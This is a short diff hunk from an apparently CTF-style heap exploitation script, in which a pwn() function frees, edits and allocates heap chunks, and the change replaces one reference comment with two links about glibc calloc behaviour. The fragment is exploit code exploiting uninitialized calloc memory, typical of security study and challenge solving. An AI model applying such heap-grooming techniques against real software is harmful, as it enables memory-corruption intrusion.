@@ -32,8 +32,8 @@ def pwn():
 	free(1)
 
 	edit(0, 0x68)
-
-	# see github.com/andigena/ptmalloc-fanzine/blob/master/03-scraps/uninitialized_calloc.c
+	# [1] https://github.com/str8outtaheap/heapwn/blob/master/malloc/__libc_calloc.c#L89
+	# [2] github.com/andigena/ptmalloc-fanzine/blob/master/03-scraps/uninitialized_calloc.c
 	alloc(0xf0, 'G'*7) # 6
 
 	r.recvline()
